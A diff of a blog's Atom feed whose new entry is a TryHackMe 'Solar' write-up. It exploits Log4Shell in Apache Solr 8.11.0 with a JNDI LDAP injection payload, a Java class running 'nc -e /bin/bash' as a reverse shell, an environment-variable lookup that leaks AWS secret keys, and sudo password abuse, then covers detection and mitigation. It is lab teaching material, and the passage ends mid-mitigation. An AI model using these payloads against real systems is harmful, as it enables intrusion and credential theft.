@@ -1,4 +1,345 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-15T03:16:58+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">nafsuuddini08.io</title><subtitle>This my blog where i post some projects and tutorials stuff.</subtitle><author><name>Nafsu Uddin</name></author><entry><title type="html">HTB - LogForge</title><link href="http://localhost:4000/htb-logforge/" rel="alternate" type="text/html" title="HTB - LogForge" /><published>2022-01-14T00:00:00+01:00</published><updated>2022-01-14T00:00:00+01:00</updated><id>http://localhost:4000/htb-logforge</id><content type="html" xml:base="http://localhost:4000/htb-logforge/">&lt;p&gt;LogForge is a linux machine with a medium level of difficulty both in the exploitation phase and the escalation of privileges, in this machine we take advantage of the vulnerability of the apache tomcat service to have access to the manager panel and we will also be exploiting a very critical vulnerability that has just been released recently which is the log4shell.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-19T18:58:18+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">nafsuuddini08.io</title><subtitle>This my blog where i post some projects and tutorials stuff.</subtitle><author><name>Nafsu Uddin</name></author><entry><title type="html">Tryhackme - Solar</title><link href="http://localhost:4000/tryh-solar/" rel="alternate" type="text/html" title="Tryhackme - Solar" /><published>2022-01-16T00:00:00+01:00</published><updated>2022-01-16T00:00:00+01:00</updated><id>http://localhost:4000/tryh-solar</id><content type="html" xml:base="http://localhost:4000/tryh-solar/">&lt;p&gt;Solar is a linux machine with medium difficulty level in the exploitation phase and easy in privilege escalation, this machine runs the apache solr 8.11.0 service which is vulnerable to log4shell and also explains what is log4j, how it works, how to exploit log4shell step by step and ways to mitigate this vulnerability.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/portada.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;The first thing we are going to do is to create a file with the machine name, and inside of that file with &lt;strong&gt;&lt;em&gt;mkt&lt;/em&gt;&lt;/strong&gt; we are going to create to following directories (the mkt function remember that I have it defined in the &lt;strong&gt;&lt;em&gt;~/.zshr&lt;/em&gt;&lt;/strong&gt; to create those directories.).&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura1.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;recognition&quot;&gt;Recognition&lt;/h2&gt;
+
+&lt;p&gt;First we send an icmp trace to see if we have a connection on the victim machine, and with the ttl i know this is a linux machine, remember that linux machines have ttl 64 and windows machines have ttl 128.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura2.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;task-2---scanning&quot;&gt;Task 2 - Scanning&lt;/h2&gt;
+
+&lt;p&gt;I am going to perform a tcp syn scan by adding the min-rate parameter to make the scan go as fast as possible, and the evidence of the scan I will save it in grepable format in the allports file.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.92 scan initiated Sun Jan 16 18:58:46 2022 as: nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG allports 10.10.218.103
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.218.103 ()  Status: Up
+Host: 10.10.218.103 ()  Ports: 22/open/tcp//ssh///, 111/open/tcp//rpcbind///, 8983/open/tcp/////        Ignored State: closed (65532)
+# Nmap done at Sun Jan 16 18:58:59 2022 -- 1 IP address (1 host up) scanned in 13.59 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Basically i save it in the grepable format is that i have a function defined in the ~/.zshrc called &lt;strong&gt;&lt;em&gt;extractports&lt;/em&gt;&lt;/strong&gt; that indicating the name of the file shows me the ports in a more elegant way and copies the ports it to clipboard.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura3.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Extractports script:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;extractPorts&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\d{1,5}/open'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $1}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt; | xargs | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;ip_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] Extracting information...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; extractPorts.tmp
+        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] IP Address: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip_address&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; extractPorts.tmp
+        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] Open ports: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ports&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; extractPorts.tmp
+        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ports&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\n'&lt;/span&gt; | xclip &lt;span class=&quot;nt&quot;&gt;-sel&lt;/span&gt; clip
+        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Ports copied to clipboard&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; extractPorts.tmp
+        &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;extractPorts.tmp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;extractPorts.tmp
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And with the ports discovered we are going to perform another scan to know the versions of the services that run those ports with some recognition scripts (-sCV), and i will save the evidence of the scan in nmap format (it is advisable to save the scans in a file to avoid re-scanning).&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.92 scan initiated Sun Jan 16 19:00:30 2022 as: nmap -sCV -p22,111,8983 -oN targeted 10.10.218.103
+Nmap scan report for 10.10.218.103
+Host is up (0.066s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 e2:35:e1:4f:4e:87:45:9e:5f:2c:97:e0:da:a9:df:d5 (RSA)
+|   256 b2:fd:9b:75:1c:9e:80:19:5d:13:4e:8d:a0:83:7b:f9 (ECDSA)
+|_  256 75:20:0b:43:14:a9:8a:49:1a:d9:29:33:e1:b9:1a:b6 (ED25519)
+111/tcp  open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+8983/tcp open  http    Apache Solr
+| http-title: Solr Admin
+|_Requested resource was http://10.10.218.103:8983/solr/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Jan 16 19:00:45 2022 -- 1 IP address (1 host up) scanned in 14.66 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;As there is a http service on port 8983 with whatweb we do a small recognition as if it were wappalyzere extension, to know the version of the web service, cms, etc.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura4.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;If we access with the ip address on the port 8983 we will be in the apache solr admin page as you can see. So if you asking what is apache solr? it’s an open source search platform that has written in java from apache lucene project library, basically is used to optimezed a search quries and search indexes for large amounts of data and it’s used for many apps or websites that require a search engine for a lot of content and part of this functionality involves the use of cores,  once of examples can be the eccommerce websites.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura5.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;task-3---discovery&quot;&gt;Task 3 - Discovery&lt;/h2&gt;
+
+&lt;p&gt;Basically what it is telling us is that the version apache solr 8.11.0 has log4j vulnerabilities, basically apache solr to store logs uses the log4j. And it is indicaticating us that this machine the apache solr has the minimum installation and configuration but that it does influence much since it is to give us to understand the attack.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura7.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;If we go back in the website we can see where tha path where the logs are stored in solr.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura6.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;In the task it’s tells us to install a file that contain solr logs to get an idea of what they look like. So let’s unzip that zip file.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura8.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;If we open one of the files we can see how the logs are stored in solr, but something interesting is that an &lt;strong&gt;&lt;em&gt;INFO&lt;/em&gt;&lt;/strong&gt; entry that is shown repeatedly which is the &lt;strong&gt;&lt;em&gt;admin/cores&lt;/em&gt;&lt;/strong&gt; url endpoint.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura9.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Looking at these log entries we can see that in the &lt;strong&gt;&lt;em&gt;parms&lt;/em&gt;&lt;/strong&gt; field there are no info is shown, so thats mean that we could modify or add values in that specific parameter that will serve us to exploit the log4j.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura10.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;task-4---proof-of-concept&quot;&gt;Task 4 - Proof of Concept&lt;/h2&gt;
+
+&lt;p&gt;Well is tells us one of the pontential routes that we can exploit the log4j in this particular version of solr that we will be access in moment and we have alreadyseen one of the attack vector (&lt;strong&gt;&lt;em&gt;perms&lt;/em&gt;&lt;/strong&gt;). And in the documentation it show us some examples of how to perform lookups with the following syntaxes in log4j, which first would be add the prefix and then would be the name or code to be executed, and we can see that among them we can perform lookups for env variables and about the system.&lt;/p&gt;
+
+&lt;p&gt;And it is show us to how abuse this, that first it would be to invoke the jndi plugin and then we indicate that it connects is our attacker ldap server: &lt;strong&gt;&lt;em&gt;${jndi:ldap://ATTACKERIP:1389/PORT}&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;So in the documentation it’s says that the log4j vuln will invoke functionality from “JNDI”, or the “Java Naming and Directory Interface”. First of all is a directory service that allows any java software to find data through a directory using a name service, basically it’s objective is to obtain data from other system or servers very easily and even to obtain java objects remotely (which where the problem comes from), jdni allow us to use variety directory service like ldap, rmi and more. So in this case with log4j we can utilize jndi lookups in conjunction with ldap to obtain an external resource that’s being stored on any server. So some version of apache come with a pre-package with the jndi lookup plugin which is vuln. more info &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Now as attackers can use the jndi plugin with a malicious ldap referral server to share a malicious java class or payload.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura11.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Here it tells us that this syntax can be injected into any entry in which the logs are being registred (forms, http addresses, etc).&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura12.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So in this particular version of apache solr there is an api endpoint url which is the &lt;strong&gt;&lt;em&gt;solr/Admin/cores&lt;/em&gt;&lt;/strong&gt; route we can inject the jndi lookup plugin, somethinglike this: &lt;strong&gt;&lt;em&gt;http://MACHINE_IP:8983/solr/admin/cores?cmd=${jndi:ldap://IP:1389/}&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura14.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Ok so to know if the website is vulnerable to logj4 and if it’s using log4j we need to use the following commands:&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura13.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So first we need to listen with netcat to receive connection, and in a another window with the curl command we are going to inject the jndi lookup specifying our attacker ip address and the port that we are listening in netcat (which in my case it’s the port 9999), and if we are receive a connection it’s mean that the website is using the log4j and it’s vulnerable. And with this we would resolve the POC.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura15.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;task-5---exploitation&quot;&gt;Task 5 - Exploitation&lt;/h2&gt;
+
+&lt;p&gt;In this case it tells us in the documentation how to exploit the logj to get a reverse shell, first we need to listen with netcat to receive the connection as we done in the POC, then it tells as that we need to execute a ldap refferal server and with python or php host the payload that we want to execute on the victim machine.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura16.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So we need to clone this &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;repo&lt;/a&gt; to execute in our attacker machine the ldap referral server. In the README file of this repo it tells us that we must to hace &lt;strong&gt;&lt;em&gt;java 8&lt;/em&gt;&lt;/strong&gt; to be able to run our ldap server, in the case if we don’t have java 8 installed on our attacker machine we must be follow the following installation steps shown in the documentation.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura21.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now with maven what we are going to do is to compile all the dependencies from the marshalsec repo that will be inside a folder called &lt;strong&gt;&lt;em&gt;target&lt;/em&gt;&lt;/strong&gt; that will contain the &lt;strong&gt;&lt;em&gt;.jar&lt;/em&gt;&lt;/strong&gt; file. If you dont have maven installed on your machine use the cammand: &lt;strong&gt;&lt;em&gt;apt install maven&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura22.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now we ara going to run our ldap referral server to direct connections to our secondary http server that will be host the java payload.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura23.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now let’s use this java payload to get a reverse shell with netcat specifying our ip address and the port that we are going listen to.&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nc -e /bin/bash 10.8.40.42 9999&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then we are need to compile this java payload into a java class with the following command.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura25.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;With python we are going to host this java class payload to download or transfer in the victim machine.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura26.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now in another window we going to execute with curl the same command that we executed in the POC but this time we will put the name of the payload that we are hosting in python (btw you can use the http request in the browser if you want, but i recommend with curl). and as you can see that in the http server in python we have received a GET request and in netcat we already have access to the machine. And now that how we are exploit the logj vulnerabilities.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura27.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;If you have any problems to execute the reverse shell, here are some possible solutions.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura28.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;task-6---persistence&quot;&gt;Task 6 - Persistence&lt;/h2&gt;
+
+&lt;p&gt;once we have access we are going to spawn a proper console with python (or you can use the command: &lt;strong&gt;&lt;em&gt;script /dev/null -c bash)&lt;/em&gt;&lt;/strong&gt; and then do the tty treatment as indicated in the documentation to move better through the console.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura29.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now we are going to export two env variables, which is &lt;strong&gt;&lt;em&gt;xterm&lt;/em&gt;&lt;/strong&gt; to get a appropriate shell to use commands like &lt;strong&gt;&lt;em&gt;clear&lt;/em&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;em&gt;bash&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura31.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;If we use the command &lt;strong&gt;&lt;em&gt;cat /etc/passwd&lt;/em&gt;&lt;/strong&gt; we can see all the users that exist in the system.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura32.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;With the command &lt;strong&gt;&lt;em&gt;sudo -l&lt;/em&gt;&lt;/strong&gt; let’s check if we have sudo permissions, and as you can see it’s indicate &lt;strong&gt;&lt;em&gt;NOPASSWS&lt;/em&gt;&lt;/strong&gt; thats mean that we can run all sudo commands without the user password.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura33.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And since we don’t the password, what we can do is to change the user password on the system since we have permissions to execute sudo commands without the password, with the command &lt;strong&gt;&lt;em&gt;passwd&lt;/em&gt;&lt;/strong&gt; we will add a new password.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura34.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And once we change the password we can connect with ssh to the victim machine.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura35.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;task-7---detection&quot;&gt;Task 7 - Detection&lt;/h2&gt;
+
+&lt;p&gt;And here it tells us the tools that we can use to detect if our java app has this vulnerability, among them detecting log4j packages that are vulnerable or detecting culnerable JAR files.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura36.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Here we can see the directory where the apache solr logs are stored.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura37.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;In this case if we access one of these files, which in this case in the &lt;strong&gt;&lt;em&gt;solr.log&lt;/em&gt;&lt;/strong&gt; file  we can see that inside the perms field the jndi lookup has ben injected which is connect our ldap referral server and execute the malicious payload, and this would be a wey to detect this vulnerability in the log files.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura38.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;task-8---bypasses&quot;&gt;Task 8 - Bypasses&lt;/h2&gt;
+
+&lt;p&gt;And here it show us the possibles bypasses that it can be use if we are attacker, Among them we can extract env variables that can contain some type of access key, for example the &lt;strong&gt;&lt;em&gt;${env:AWS_SECRET_ACCESS_KEY}&lt;/em&gt;&lt;/strong&gt; which is very very critical. btw it’s not necessary to run a ldap referral server we can use rmi protocol to search for external resources or to inject jndi lookups.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura39.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So we can use the command &lt;strong&gt;&lt;em&gt;printenv&lt;/em&gt;&lt;/strong&gt; to use the env variables in the system, and se if there have a exfiltration.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura40.png&quot; /&gt;  
+&lt;/p&gt;
+
+&lt;h2 id=&quot;task-9---mitigation&quot;&gt;Task 9 - Mitigation&lt;/h2&gt;
+
+&lt;p&gt;In the case of apache solr we can perform this mitigation to aviod this type of attack.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura43.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;First we are gon a locate the file &lt;strong&gt;&lt;em&gt;solr.in.sh&lt;/em&gt;&lt;/strong&gt; which is contain the apache solr env variables.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura45.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So once we have located it the file we open it with your favorite bash editor, and we are gon a paste this sentence &lt;strong&gt;&lt;em&gt;SOLR_OPTS=”$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true”&lt;/em&gt;&lt;/strong&gt; that we can’t perform external lookups with jndi. Then save the file.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura46.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And now restart the apache solr service to apply the changes that we make.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
